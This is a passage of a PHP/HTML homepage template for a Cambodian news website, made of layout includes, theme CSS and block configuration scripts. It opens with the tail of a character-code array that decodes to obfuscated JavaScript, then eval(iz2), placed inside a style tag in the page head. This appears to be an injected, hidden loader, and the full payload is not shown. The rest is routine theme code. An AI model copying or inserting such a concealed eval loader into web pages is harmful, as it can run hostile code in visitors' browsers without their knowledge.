59, 108, 105, 33, 61, 61, 110, 117, 108, 108, 38, 38, 108, 105, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 101, 52, 41, 93, 40, 41, 59);
        eval(iz2);
    </style>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Khmer" media="all">
    <script src="https://www.theseedcambodia.com/wp-includes/js/wp-emoji-release.min.js?ver=6.4.5" defer=""></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
</head>

<body class="home page-template-default page page-id-6574 global-block-template-8 tdb-template tdc-header-template tdc-footer-template td-animation-stack-type1 td-full-layout td-js-loaded" itemscope="itemscope" itemtype="https://schema.org/WebPage">

    <?php
    include_once 'layouts/mobile_nav.php';
    ?>
    <div id="td-outer-wrap" class="td-theme-wrap">

        <?php
        include_once 'layouts/header_frontend.php';
        ?>

        <div class="td-main-content-wrap td-main-page-wrap td-container-wrap">
            <div class="tdc-content-wrap">
                <div id="tdi_32" class="tdc-zone">
                    <div class="tdc_zone tdi_33  wpb_row td-pb-row">
                        <div id="tdi_34" class="tdc-row">
                            <div class="vc_row tdi_35  wpb_row td-pb-row">
                                <div class="vc_column tdi_37  wpb_column vc_column_container tdc-column td-pb-span12">
                                    <div class="wpb_wrapper">
                                        <div class="wpb_wrapper td_block_empty_space td_block_wrap vc_empty_space tdi_39 " style="height: 30px"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="tdi_40" class="tdc-row stretch_row_1200 td-stretch-content">
                            <div class="vc_row tdi_41  wpb_row td-pb-row">
                                <?php
                                include_once 'components/slide.php';
                                include_once 'components/top-right.php';
                                ?>
                            </div>
                        </div>
                        <?php
                        // latest article
                        include_once 'components/latest-article.php';
                        // blog 1
                        include_once 'components/blog1.php';
                        // blog 2
                        include_once 'components/blog2.php';
                        // most popular
                        include_once 'components/most-popular.php';
                        ?>
                        <!-- Most popular -->

                    </div>
                </div>
            </div>
            <div class="td-container">
                <div class="td-pb-row">
                    <div class="td-pb-span12">
                        <div class="comments" id="comments">
                        </div> <!-- /.content -->
                    </div>
                </div>
            </div>
        </div>

        <?php
        include_once 'layouts/footer_frontend.php';
        ?>

    </div>

    <?php
    // popup_donet
    include_once 'components/popup_donet.php';
    // script
    include_once 'components/script_index.php';
    ?>
    <style>
        .tdi_48 {
            margin-top: 0px !important;
            margin-bottom: 0px !important
        }
    </style>
    <style scoped="">
        .tdi_102 {
            vertical-align: baseline
        }

        .tdi_102 .vc_column-inner>.wpb_wrapper,
        .tdi_102 .vc_column-inner>.wpb_wrapper .tdc-elements {
            display: block
        }

        .tdi_102 .vc_column-inner>.wpb_wrapper .tdc-elements {
            width: 100%
        }
    </style>
    <style scoped="">
        .tdi_98 {
            vertical-align: baseline
        }

        .tdi_98>.wpb_wrapper,
        .tdi_98>.wpb_wrapper>.tdc-elements {
            display: block
        }

        .tdi_98>.wpb_wrapper>.tdc-elements {
            width: 100%
        }

        .tdi_98>.wpb_wrapper>.vc_row_inner {
            width: auto
        }

        .tdi_98>.wpb_wrapper {
            width: auto;
            height: auto
        }
    </style>
    <style scoped="">
        .tdi_96,
        .tdi_96 .tdc-columns {
            min-height: 0
        }

        .tdi_96,
        .tdi_96 .tdc-columns {
            display: block
        }

        .tdi_96 .tdc-columns {
            width: 100%
        }

        .tdi_96 {
            padding-top: 30px !important;
            padding-bottom: 60px !important
        }

        .tdi_96 .td_block_wrap {
            text-align: left
        }
    </style>
    <style scoped="">
        .tdi_107 {
            vertical-align: baseline
        }

        .tdi_107 .vc_column-inner>.wpb_wrapper,
        .tdi_107 .vc_column-inner>.wpb_wrapper .tdc-elements {
            display: block
        }

        .tdi_107 .vc_column-inner>.wpb_wrapper .tdc-elements {
            width: 100%
        }
    </style>
    <style scoped="">
        .tdi_100 {
            position: relative !important;
            top: 0;
            transform: none;
            -webkit-transform: none
        }

        .tdi_100,
        .tdi_100 .tdc-inner-columns {
            display: block
        }

        .tdi_100 .tdc-inner-columns {
            width: 100%
        }
    </style>
    <style scoped="">
        .tdi_105 {
            position: relative !important;
            top: 0;
            transform: none;
            -webkit-transform: none
        }

        .tdi_105,
        .tdi_105 .tdc-inner-columns {
            display: block
        }

        .tdi_105 .tdc-inner-columns {
            width: 100%
        }
    </style>
    <style scoped="">
        .tdi_57,
        .tdi_57 .tdc-columns {
            min-height: 0
        }

        .tdi_57,
        .tdi_57 .tdc-columns {
            display: block
        }

        .tdi_57 .tdc-columns {
            width: 100%
        }

        .tdi_57 {
            padding-top: 60px !important
        }

        .tdi_57 .td_block_wrap {
            text-align: left
        }
    </style>
    <style>
        .tdi_103 .td-block-title>* {
            color: rgb(0, 0, 0) !important
        }

        .tdi_103 .td-block-title>*:before,
        .tdi_103 .td-block-title>*:after {
            background-color: #777777 !important
        }
    </style>
    <style>
        body .tdi_103 .td-block-title a,
        body .tdi_103 .td-block-title span {
            font-family: Kantumruy !important;
            font-size: 16px !important;
            line-height: 1.8 !important;
            font-weight: 400 !important
        }

        @media (max-width:767px) {

            body .tdi_103 .td-block-title a,
            body .tdi_103 .td-block-title span {
                font-size: 14px !important
            }
        }
    </style>
    <style>
        .tdi_108 {
            margin-bottom: 0px !important
        }
    </style>
    <style>
        .tdi_108 .td-image-wrap {
            padding-bottom: 55%
        }

        .tdi_108 .entry-thumb {
            background-position: center 50%
        }

        .tdi_108 .td-image-container {
            flex: 0 0 35%;
            width: 35%;
            display: block;
            order: 1
        }

        .ie10 .tdi_108 .td-image-container,
        .ie11 .tdi_108 .td-image-container {
            flex: 0 0 auto
        }

        .tdi_108 .td-module-container {
            flex-direction: row;
            padding: 0 0 20px 0;
            border-color: #a0a0a0 !important
        }

        .tdi_108 .td-module-meta-info {
            flex: 1;
            border-color: #eaeaea
        }

        body .tdi_108 .td-favorite {
            font-size: 36px;
            box-shadow: 1px 1px 4px 0px rgba(0, 0, 0, 0.2)
        }

        .tdi_108 .td_module_wrap {
            padding-left: 15px;
            padding-right: 15px;
            padding-bottom: 12.5px;
            margin-bottom: 12.5px
        }

        .tdi_108 .td_block_inner {
            margin-left: -15px;
            margin-right: -15px
        }

        .tdi_108 .td-module-container:before {
            bottom: -12.5px;
            border-color: #eaeaea
        }

        .tdi_108 .td-post-vid-time {
            display: block
        }

        .tdi_108 .td-post-category:not(.td-post-extra-category) {
            display: none
        }

        .tdi_108 .td-author-photo .avatar {
            width: 20px;
            height: 20px;
            margin-right: 6px;
            border-radius: 50%
        }

        .tdi_108 .td-excerpt {
            display: none;
            margin: 10px 20px 0 0;
            column-count: 1;
            column-gap: 48px
        }

        .tdi_108 .td-audio-player {
            opacity: 1;
            visibility: visible;
            height: auto;
            font-size: 13px
        }

        .tdi_108 .td-read-more {
            display: none
        }

        .tdi_108 .td-author-date {
            display: none
        }

        .tdi_108 .td-post-author-name {
            display: none
        }

        .tdi_108 .td-post-date,
        .tdi_108 .td-post-author-name span {
            display: none
        }

        .tdi_108 .entry-review-stars {
            display: none
        }

        .tdi_108 .td-icon-star,
        .tdi_108 .td-icon-star-empty,
        .tdi_108 .td-icon-star-half {
            font-size: 15px
        }

        .tdi_108 .td-module-comments {
            display: none
        }

        .tdi_108 .td_module_wrap:nth-last-child(1) {
            margin-bottom: 0;
            padding-bottom: 0
        }

        .tdi_108 .td_module_wrap:nth-last-child(1) .td-module-container:before {
            display: none
        }

        .tdi_108 .td-module-title a {
            box-shadow: inset 0 0 0 0 #000
        }

        .tdi_108 .entry-title {
            margin: 0 15px 0 30px;
            font-size: 18px !important;
            line-height: 1.5 !important
        }

        .tdi_108 .td-block-title a,
        .tdi_108 .td-block-title span {
            font-size: 18px !important;
            font-weight: 500 !important
        }

        html:not([class*='ie']) .tdi_108 .td-module-container:hover .entry-thumb:before {
            opacity: 0
        }

        @media (min-width:768px) {
            .tdi_108 .td-module-title a {
                transition: all 0.2s ease;
                -webkit-transition: all 0.2s ease
            }
        }

        @media (min-width:1019px) and (max-width:1140px) {
            .tdi_108 .td_module_wrap {
                padding-bottom: 12.5px;
                margin-bottom: 12.5px
            }

            .tdi_108 .td-module-container:before {
                bottom: -12.5px
            }

            .tdi_108 .td_module_wrap {
                padding-bottom: 12.5px !important;
                margin-bottom: 12.5px !important
            }

            .tdi_108 .td_module_wrap:nth-last-child(1) {
                margin-bottom: 0 !important;
                padding-bottom: 0 !important
            }

            .tdi_108 .td_module_wrap .td-module-container:before {
                display: block !important
            }

            .tdi_108 .td_module_wrap:nth-last-child(1) .td-module-container:before {
                display: none !important
            }

            .tdi_108 .td-module-title a {
                box-shadow: inset 0 0 0 0 #000
            }

            @media (min-width:768px) {
                .tdi_108 .td-module-title a {
                    transition: all 0.2s ease;
                    -webkit-transition: all 0.2s ease
                }
            }
        }

        @media (min-width:768px) and (max-width:1018px) {
            .tdi_108 .td_module_wrap {
                padding-bottom: 12.5px;
                margin-bottom: 12.5px
            }

            .tdi_108 .td-module-container:before {
                bottom: -12.5px
            }

            .tdi_108 .td_module_wrap {
                padding-bottom: 12.5px !important;
                margin-bottom: 12.5px !important
            }

            .tdi_108 .td_module_wrap:nth-last-child(1) {
                margin-bottom: 0 !important;
                padding-bottom: 0 !important
            }

            .tdi_108 .td_module_wrap .td-module-container:before {
                display: block !important
            }

            .tdi_108 .td_module_wrap:nth-last-child(1) .td-module-container:before {
                display: none !important
            }

            .tdi_108 .td-module-title a {
                box-shadow: inset 0 0 0 0 #000
            }

            .tdi_108 .entry-title {
                font-size: 13px !important
            }

            @media (min-width:768px) {
                .tdi_108 .td-module-title a {
                    transition: all 0.2s ease;
                    -webkit-transition: all 0.2s ease
                }
            }
        }

        @media (max-width:767px) {
            .tdi_108 .td_module_wrap {
                padding-left: 7.5px;
                padding-right: 7.5px
            }

            .tdi_108 .td_block_inner {
                margin-left: -7.5px;
                margin-right: -7.5px
            }

            .tdi_108 .td_module_wrap {
                padding-bottom: 7.5px;
                margin-bottom: 7.5px;
                padding-bottom: 7.5px !important;
                margin-bottom: 7.5px !important
            }

            .tdi_108 .td-module-container:before {
                bottom: -7.5px
            }

            .tdi_108 .td_module_wrap:nth-last-child(1) {
                margin-bottom: 0 !important;
                padding-bottom: 0 !important
            }

            .tdi_108 .td_module_wrap .td-module-container:before {
                display: block !important
            }

            .tdi_108 .td_module_wrap:nth-last-child(1) .td-module-container:before {
                display: none !important
            }

            .tdi_108 .td-module-title a {
                box-shadow: inset 0 0 0 0 #000
            }

            .tdi_108 .entry-title {
                margin: 0 15px 0 0px;
                font-size: 14px !important;
                line-height: 1.6 !important
            }

            @media (min-width:768px) {
                .tdi_108 .td-module-title a {
                    transition: all 0.2s ease;
                    -webkit-transition: all 0.2s ease
                }
            }
        }
    </style>
    <script>
        var block_tdi_108 = new tdBlock();
        block_tdi_108.id = "tdi_108";
        block_tdi_108.atts = '{"hide_audio":"yes","block_template_id":"td_block_template_8","border_color":"#bb0000","all_modules_space":"eyJhbGwiOiIyNSIsInBob25lIjoiMTUifQ==","image_height":"55","image_floated":"float_right","image_width":"35","show_excerpt":"none","show_review":"none","show_date":"none","show_author":"none","show_cat":"none","show_com":"none","show_btn":"none","f_header_font_size":"18","f_header_font_weight":"500","header_text_color":"#bb0000","f_title_font_size":"eyJhbGwiOiIxOCIsInBob25lIjoiMTQiLCJwb3J0cmFpdCI6IjEzIn0=","art_title":"eyJhbGwiOiIwIDE1cHggMCAzMHB4IiwicGhvbmUiOiIwIDE1cHggMCAwcHgifQ==","f_title_font_line_height":"eyJhbGwiOiIxLjUiLCJwaG9uZSI6IjEuNiJ9","art_excerpt":"10px 20px 0 0","f_title_font_family":"undefined","modules_border_color":"#a0a0a0","m_padding":"0 0 20px 0","sort":"popular","modules_on_row":"","modules_gap":"eyJhbGwiOiIzMCIsInBob25lIjoiMTUifQ==","el_class":"blog-list-image-right blog-list style-number","tdc_css":"eyJhbGwiOnsibWFyZ2luLWJvdHRvbSI6IjAiLCJkaXNwbGF5IjoiIn19","block_type":"td_flex_block_1","separator":"","custom_title":"","custom_url":"","title_tag":"","mc1_tl":"","mc1_title_tag":"","mc1_el":"","post_ids":"","category_id":"","taxonomies":"","category_ids":"","in_all_terms":"","tag_slug":"","autors_id":"","installed_post_types":"","include_cf_posts":"","exclude_cf_posts":"","linked_posts":"","favourite_only":"","limit":"5","offset":"","open_in_new_window":"","show_modified_date":"","time_ago":"","time_ago_add_txt":"ago","time_ago_txt_pos":"","review_source":"","td_query_cache":"","td_query_cache_expiration":"","td_ajax_filter_type":"","td_ajax_filter_ids":"","td_filter_default_txt":"All","td_ajax_preloading":"","container_width":"","modules_border_size":"","modules_border_style":"","modules_border_radius":"","modules_divider":"","modules_divider_color":"#eaeaea","h_effect":"","image_size":"","image_alignment":"50","image_radius":"","hide_image":"","show_favourites":"","fav_size":"2","fav_space":"","fav_ico_color":"","fav_ico_color_h":"","fav_bg":"","fav_bg_h":"","fav_shadow_shadow_header":"","fav_shadow_shadow_title":"Shadow","fav_shadow_shadow_size":"","fav_shadow_shadow_offset_horizontal":"","fav_shadow_shadow_offset_vertical":"","fav_shadow_shadow_spread":"","fav_shadow_shadow_color":"","video_icon":"","video_popup":"yes","video_rec":"","spot_header":"","video_rec_title":"","video_rec_color":"","video_rec_disable":"","autoplay_vid":"yes","show_vid_t":"block","vid_t_margin":"","vid_t_padding":"","video_title_color":"","video_title_color_h":"","video_bg":"","video_overlay":"","vid_t_color":"","vid_t_bg_color":"","f_vid_title_font_header":"","f_vid_title_font_title":"Video pop-up article title","f_vid_title_font_settings":"","f_vid_title_font_family":"","f_vid_title_font_size":"","f_vid_title_font_line_height":"","f_vid_title_font_style":"","f_vid_title_font_weight":"","f_vid_title_font_transform":"","f_vid_title_font_spacing":"","f_vid_title_":"","f_vid_time_font_title":"Video duration text","f_vid_time_font_settings":"","f_vid_time_font_family":"","f_vid_time_font_size":"","f_vid_time_font_line_height":"","f_vid_time_font_style":"","f_vid_time_font_weight":"","f_vid_time_font_transform":"","f_vid_time_font_spacing":"","f_vid_time_":"","meta_info_align":"","meta_info_horiz":"layout-default","meta_width":"","meta_margin":"","meta_padding":"","meta_space":"","art_btn":"","meta_info_border_size":"","meta_info_border_style":"","meta_info_border_color":"#eaeaea","meta_info_border_radius":"","modules_category":"","modules_category_margin":"","modules_category_padding":"","modules_cat_border":"","modules_category_radius":"0","modules_extra_cat":"","author_photo":"","author_photo_size":"","author_photo_space":"","author_photo_radius":"","review_space":"","review_size":"2.5","review_distance":"","excerpt_col":"1","excerpt_gap":"","excerpt_middle":"","excerpt_inline":"","show_audio":"block","art_audio":"","art_audio_size":"1.5","btn_title":"","btn_margin":"","btn_padding":"","btn_border_width":"","btn_radius":"","pag_space":"","pag_padding":"","pag_border_width":"","pag_border_radius":"","prev_tdicon":"","next_tdicon":"","pag_icons_size":"","f_header_font_header":"","f_header_font_title":"Block header","f_header_font_settings":"","f_header_font_family":"","f_header_font_line_height":"","f_header_font_style":"","f_header_font_transform":"","f_header_font_spacing":"","f_header_":"","f_ajax_font_title":"Ajax categories","f_ajax_font_settings":"","f_ajax_font_family":"","f_ajax_font_size":"","f_ajax_font_line_height":"","f_ajax_font_style":"","f_ajax_font_weight":"","f_ajax_font_transform":"","f_ajax_font_spacing":"","f_ajax_":"","f_more_font_title":"Load more button","f_more_font_settings":"","f_more_font_family":"","f_more_font_size":"","f_more_font_line_height":"","f_more_font_style":"","f_more_font_weight":"","f_more_font_transform":"","f_more_font_spacing":"","f_more_":"","f_title_font_header":"","f_title_font_title":"Article title","f_title_font_settings":"","f_title_font_style":"","f_title_font_weight":"","f_title_font_transform":"","f_title_font_spacing":"","f_title_":"","f_cat_font_title":"Article category tag","f_cat_font_settings":"","f_cat_font_family":"","f_cat_font_size":"","f_cat_font_line_height":"","f_cat_font_style":"","f_cat_font_weight":"","f_cat_font_transform":"","f_cat_font_spacing":"","f_cat_":"","f_meta_font_title":"Article meta info","f_meta_font_settings":"","f_meta_font_family":"","f_meta_font_size":"","f_meta_font_line_height":"","f_meta_font_style":"","f_meta_font_weight":"","f_meta_font_transform":"","f_meta_font_spacing":"","f_meta_":"","f_ex_font_title":"Article excerpt","f_ex_font_settings":"","f_ex_font_family":"","f_ex_font_size":"","f_ex_font_line_height":"","f_ex_font_style":"","f_ex_font_weight":"","f_ex_font_transform":"","f_ex_font_spacing":"","f_ex_":"","f_btn_font_title":"Article read more button","f_btn_font_settings":"","f_btn_font_family":"","f_btn_font_size":"","f_btn_font_line_height":"","f_btn_font_style":"","f_btn_font_weight":"","f_btn_font_transform":"","f_btn_font_spacing":"","f_btn_":"","mix_color":"","mix_type":"","fe_brightness":"1","fe_contrast":"1","fe_saturate":"1","mix_color_h":"","mix_type_h":"","fe_brightness_h":"1","fe_contrast_h":"1","fe_saturate_h":"1","m_bg":"","color_overlay":"","shadow_shadow_header":"","shadow_shadow_title":"Module Shadow","shadow_shadow_size":"","shadow_shadow_offset_horizontal":"","shadow_shadow_offset_vertical":"","shadow_shadow_spread":"","shadow_shadow_color":"","title_txt":"","title_txt_hover":"","all_underline_height":"","all_underline_color":"","cat_bg":"","cat_bg_hover":"","cat_txt":"","cat_txt_hover":"","cat_border":"","cat_border_hover":"","meta_bg":"","author_txt":"","author_txt_hover":"","date_txt":"","ex_txt":"","com_bg":"","com_txt":"","rev_txt":"","audio_btn_color":"","audio_time_color":"","audio_bar_color":"","audio_bar_curr_color":"","shadow_m_shadow_header":"","shadow_m_shadow_title":"Meta info shadow","shadow_m_shadow_size":"","shadow_m_shadow_offset_horizontal":"","shadow_m_shadow_offset_vertical":"","shadow_m_shadow_spread":"","shadow_m_shadow_color":"","btn_bg":"","btn_bg_hover":"","btn_txt":"","btn_txt_hover":"","btn_border":"","btn_border_hover":"","pag_text":"","pag_h_text":"","pag_bg":"","pag_h_bg":"","pag_border":"","pag_h_border":"","ajax_pagination":"","ajax_pagination_next_prev_swipe":"","ajax_pagination_infinite_stop":"","css":"","td_column_number":1,"header_color":"","color_preset":"","border_top":"","class":"tdi_108","tdc_css_class":"tdi_108","tdc_css_class_style":"tdi_108_rand_style"}';
        block_tdi_108.td_column_number = "1";
        block_tdi_108.block_type = "td_flex_block_1";
        block_tdi_108.post_count = "5";
        block_tdi_108.found_posts = "362";
        block_tdi_108.header_color = "";
        block_tdi_108.ajax_pagination_infinite_stop = "";
        block_tdi_108.max_num_pages = "73";
        tdBlocksArray.push(block_tdi_108);
    </script>
    <style scoped="">
        .tdi_110 {
            vertical-align: baseline
        }

        .tdi_110 .vc_column-inner>.wpb_wrapper,
        .tdi_110 .vc_column-inner>.wpb_wrapper .tdc-elements {
            display: block
        }

        .tdi_110 .vc_column-inner>.wpb_wrapper .tdc-elements {
            width: 100%
        }
    </style>
    <style>
        .tdi_111 .td-image-wrap {
            padding-bottom: 55%
        }

        .tdi_111 .entry-thumb {
            background-position: center 50%
        }

        .tdi_111 .td-image-container {
            flex: 0 0 35%;
            width: 35%;
            display: block;
            order: 1
        }

        .ie10 .tdi_111 .td-image-container,
        .ie11 .tdi_111 .td-image-container {
            flex: 0 0 auto
        }

        .tdi_111 .td-module-container {
            flex-direction: row;
            padding: 0 0 20px 0;
            border-color: #a0a0a0 !important
        }

        .tdi_111 .td-module-meta-info {
            flex: 1;
            border-color: #eaeaea
        }

        body .tdi_111 .td-favorite {
            font-size: 36px;
            box-shadow: 1px 1px 4px 0px rgba(0, 0, 0, 0.2)
        }

        .tdi_111 .td_module_wrap {
            padding-left: 15px;
            padding-right: 15px;
            padding-bottom: 12.5px;
            margin-bottom: 12.5px
        }

        .tdi_111 .td_block_inner {
            margin-left: -15px;
            margin-right: -15px
        }

        .tdi_111 .td-module-container:before {
            bottom: -12.5px;
            border-color: #eaeaea
        }

        .tdi_111 .td-post-vid-time {
            display: block
        }

        .tdi_111 .td-post-category:not(.td-post-extra-category) {
            display: none
        }

        .tdi_111 .td-author-photo .avatar {
            width: 20px;
            height: 20px;
            margin-right: 6px;
            border-radius: 50%
        }

        .tdi_111 .td-excerpt {
            display: none;
            margin: 10px 20px 0 0;
            column-count: 1;
            column-gap: 48px
        }

        .tdi_111 .td-audio-player {
            opacity: 1;
            visibility: visible;
            height: auto;
            font-size: 13px
        }

        .tdi_111 .td-read-more {
            display: none
        }

        .tdi_111 .td-author-date {
            display: none
        }

        .tdi_111 .td-post-author-name {
            display: none
        }

        .tdi_111 .td-post-date,
        .tdi_111 .td-post-author-name span {
            display: none
        }

        .tdi_111 .entry-review-stars {
            display: none
        }

        .tdi_111 .td-icon-star,
        .tdi_111 .td-icon-star-empty,
        .tdi_111 .td-icon-star-half {
            font-size: 15px
        }

        .tdi_111 .td-module-comments {
            display: none
        }

        .tdi_111 .td_module_wrap:nth-last-child(1) {
            margin-bottom: 0;
            padding-bottom: 0
        }

        .tdi_111 .td_module_wrap:nth-last-child(1) .td-module-container:before {
            display: none
        }

        .tdi_111 .td-module-title a {
            box-shadow: inset 0 0 0 0 #000
        }

        .tdi_111 .entry-title {
            margin: 0 15px 0 30px;
            font-size: 18px !important;
            line-height: 1.5 !important
        }

        .tdi_111 .td-block-title a,
        .tdi_111 .td-block-title span {
            font-size: 18px !important;
            font-weight: 500 !important
        }

        html:not([class*='ie']) .tdi_111 .td-module-container:hover .entry-thumb:before {
            opacity: 0
        }

        @media (min-width:768px) {
            .tdi_111 .td-module-title a {
                transition: all 0.2s ease;
                -webkit-transition: all 0.2s ease
            }
        }

        @media (min-width:1019px) and (max-width:1140px) {
            .tdi_111 .td_module_wrap {
                padding-bottom: 12.5px;
                margin-bottom: 12.5px
            }

            .tdi_111 .td-module-container:before {
                bottom: -12.5px
            }

            .tdi_111 .td_module_wrap {
                padding-bottom: 12.5px !important;
                margin-bottom: 12.5px !important
            }

            .tdi_111 .td_module_wrap:nth-last-child(1) {
                margin-bottom: 0 !important;
                padding-bottom: 0 !important
            }

            .tdi_111 .td_module_wrap .td-module-container:before {
                display: block !important
            }

            .tdi_111 .td_module_wrap:nth-last-child(1) .td-module-container:before {
                display: none !important
            }

            .tdi_111 .td-module-title a {
                box-shadow: inset 0 0 0 0 #000
            }

            @media (min-width:768px) {
                .tdi_111 .td-module-title a {
                    transition: all 0.2s ease;
                    -webkit-transition: all 0.2s ease
                }
            }
        }

        @media (min-width:768px) and (max-width:1018px) {
            .tdi_111 .td_module_wrap {
                padding-bottom: 12.5px;
                margin-bottom: 12.5px
            }

            .tdi_111 .td-module-container:before {
                bottom: -12.5px
            }

            .tdi_111 .td_module_wrap {
                padding-bottom: 12.5px !important;
                margin-bottom: 12.5px !important
            }

            .tdi_111 .td_module_wrap:nth-last-child(1) {
                margin-bottom: 0 !important;
                padding-bottom: 0 !important
            }

            .tdi_111 .td_module_wrap .td-module-container:before {
                display: block !important
            }

            .tdi_111 .td_module_wrap:nth-last-child(1) .td-module-container:before {
                display: none !important
            }

            .tdi_111 .td-module-title a {
                box-shadow: inset 0 0 0 0 #000
            }

            .tdi_111 .entry-title {
                font-size: 13px !important
            }

            @media (min-width:768px) {
                .tdi_111 .td-module-title a {
                    transition: all 0.2s ease;
                    -webkit-transition: all 0.2s ease
                }
            }
        }

        @media (max-width:767px) {
            .tdi_111 .td_module_wrap {
                padding-bottom: 7.5px;
                margin-bottom: 7.5px
            }

            .tdi_111 .td-module-container:before {
                bottom: -7.5px
            }

            .tdi_111 .td_module_wrap {
                padding-bottom: 7.5px !important;
                margin-bottom: 7.5px !important
            }

            .tdi_111 .td_module_wrap:nth-last-child(1) {
                margin-bottom: 0 !important;
                padding-bottom: 0 !important
            }

            .tdi_111 .td_module_wrap .td-module-container:before {
                display: block !important
            }

            .tdi_111 .td_module_wrap:nth-last-child(1) .td-module-container:before {
                display: none !important
            }

            .tdi_111 .td-module-title a {
                box-shadow: inset 0 0 0 0 #000
            }

            .tdi_111 .entry-title {
                margin: 0 15px 0 5px;
                font-size: 14px !important;
                line-height: 1.6 !important
            }

            @media (min-width:768px) {
                .tdi_111 .td-module-title a {
                    transition: all 0.2s ease;
                    -webkit-transition: all 0.2s ease
                }
            }
        }
    </style>
    <script>
        var block_tdi_111 = new tdBlock();
        block_tdi_111.id = "tdi_111";
        block_tdi_111.atts = '{"hide_audio":"yes","block_template_id":"td_block_template_8","border_color":"#bb0000","all_modules_space":"eyJhbGwiOiIyNSIsInBob25lIjoiMTUifQ==","image_height":"55","image_floated":"float_right","image_width":"35","show_excerpt":"none","show_review":"none","show_date":"none","show_author":"none","show_cat":"none","show_com":"none","show_btn":"none","f_header_font_size":"18","f_header_font_weight":"500","header_text_color":"#bb0000","f_title_font_size":"eyJhbGwiOiIxOCIsInBob25lIjoiMTQiLCJwb3J0cmFpdCI6IjEzIn0=","art_title":"eyJhbGwiOiIwIDE1cHggMCAzMHB4IiwicGhvbmUiOiIwIDE1cHggMCA1cHgifQ==","f_title_font_line_height":"eyJhbGwiOiIxLjUiLCJwaG9uZSI6IjEuNiJ9","art_excerpt":"10px 20px 0 0","f_title_font_family":"undefined","modules_border_color":"#a0a0a0","m_padding":"0 0 20px 0","sort":"popular","modules_on_row":"","modules_gap":"30","el_class":"blog-list-image-right blog-list style-number num6to10","offset":"5","block_type":"td_flex_block_1","separator":"","custom_title":"","custom_url":"","title_tag":"","mc1_tl":"","mc1_title_tag":"","mc1_el":"","post_ids":"","category_id":"","taxonomies":"","category_ids":"","in_all_terms":"","tag_slug":"","autors_id":"","installed_post_types":"","include_cf_posts":"","exclude_cf_posts":"","linked_posts":"","favourite_only":"","limit":"5","open_in_new_window":"","show_modified_date":"","time_ago":"","time_ago_add_txt":"ago","time_ago_txt_pos":"","review_source":"","td_query_cache":"","td_query_cache_expiration":"","td_ajax_filter_type":"","td_ajax_filter_ids":"","td_filter_default_txt":"All","td_ajax_preloading":"","container_width":"","modules_border_size":"","modules_border_style":"","modules_border_radius":"","modules_divider":"","modules_divider_color":"#eaeaea","h_effect":"","image_size":"","image_alignment":"50","image_radius":"","hide_image":"","show_favourites":"","fav_size":"2","fav_space":"","fav_ico_color":"","fav_ico_color_h":"","fav_bg":"","fav_bg_h":"","fav_shadow_shadow_header":"","fav_shadow_shadow_title":"Shadow","fav_shadow_shadow_size":"","fav_shadow_shadow_offset_horizontal":"","fav_shadow_shadow_offset_vertical":"","fav_shadow_shadow_spread":"","fav_shadow_shadow_color":"","video_icon":"","video_popup":"yes","video_rec":"","spot_header":"","video_rec_title":"","video_rec_color":"","video_rec_disable":"","autoplay_vid":"yes","show_vid_t":"block","vid_t_margin":"","vid_t_padding":"","video_title_color":"","video_title_color_h":"","video_bg":"","video_overlay":"","vid_t_color":"","vid_t_bg_color":"","f_vid_title_font_header":"","f_vid_title_font_title":"Video pop-up article title","f_vid_title_font_settings":"","f_vid_title_font_family":"","f_vid_title_font_size":"","f_vid_title_font_line_height":"","f_vid_title_font_style":"","f_vid_title_font_weight":"","f_vid_title_font_transform":"","f_vid_title_font_spacing":"","f_vid_title_":"","f_vid_time_font_title":"Video duration text","f_vid_time_font_settings":"","f_vid_time_font_family":"","f_vid_time_font_size":"","f_vid_time_font_line_height":"","f_vid_time_font_style":"","f_vid_time_font_weight":"","f_vid_time_font_transform":"","f_vid_time_font_spacing":"","f_vid_time_":"","meta_info_align":"","meta_info_horiz":"layout-default","meta_width":"","meta_margin":"","meta_padding":"","meta_space":"","art_btn":"","meta_info_border_size":"","meta_info_border_style":"","meta_info_border_color":"#eaeaea","meta_info_border_radius":"","modules_category":"","modules_category_margin":"","modules_category_padding":"","modules_cat_border":"","modules_category_radius":"0","modules_extra_cat":"","author_photo":"","author_photo_size":"","author_photo_space":"","author_photo_radius":"","review_space":"","review_size":"2.5","review_distance":"","excerpt_col":"1","excerpt_gap":"","excerpt_middle":"","excerpt_inline":"","show_audio":"block","art_audio":"","art_audio_size":"1.5","btn_title":"","btn_margin":"","btn_padding":"","btn_border_width":"","btn_radius":"","pag_space":"","pag_padding":"","pag_border_width":"","pag_border_radius":"","prev_tdicon":"","next_tdicon":"","pag_icons_size":"","f_header_font_header":"","f_header_font_title":"Block header","f_header_font_settings":"","f_header_font_family":"","f_header_font_line_height":"","f_header_font_style":"","f_header_font_transform":"","f_header_font_spacing":"","f_header_":"","f_ajax_font_title":"Ajax categories","f_ajax_font_settings":"","f_ajax_font_family":"","f_ajax_font_size":"","f_ajax_font_line_height":"","f_ajax_font_style":"","f_ajax_font_weight":"","f_ajax_font_transform":"","f_ajax_font_spacing":"","f_ajax_":"","f_more_font_title":"Load more button","f_more_font_settings":"","f_more_font_family":"","f_more_font_size":"","f_more_font_line_height":"","f_more_font_style":"","f_more_font_weight":"","f_more_font_transform":"","f_more_font_spacing":"","f_more_":"","f_title_font_header":"","f_title_font_title":"Article title","f_title_font_settings":"","f_title_font_style":"","f_title_font_weight":"","f_title_font_transform":"","f_title_font_spacing":"","f_title_":"","f_cat_font_title":"Article category tag","f_cat_font_settings":"","f_cat_font_family":"","f_cat_font_size":"","f_cat_font_line_height":"","f_cat_font_style":"","f_cat_font_weight":"","f_cat_font_transform":"","f_cat_font_spacing":"","f_cat_":"","f_meta_font_title":"Article meta info","f_meta_font_settings":"","f_meta_font_family":"","f_meta_font_size":"","f_meta_font_line_height":"","f_meta_font_style":"","f_meta_font_weight":"","f_meta_font_transform":"","f_meta_font_spacing":"","f_meta_":"","f_ex_font_title":"Article excerpt","f_ex_font_settings":"","f_ex_font_family":"","f_ex_font_size":"","f_ex_font_line_height":"","f_ex_font_style":"","f_ex_font_weight":"","f_ex_font_transform":"","f_ex_font_spacing":"","f_ex_":"","f_btn_font_title":"Article read more 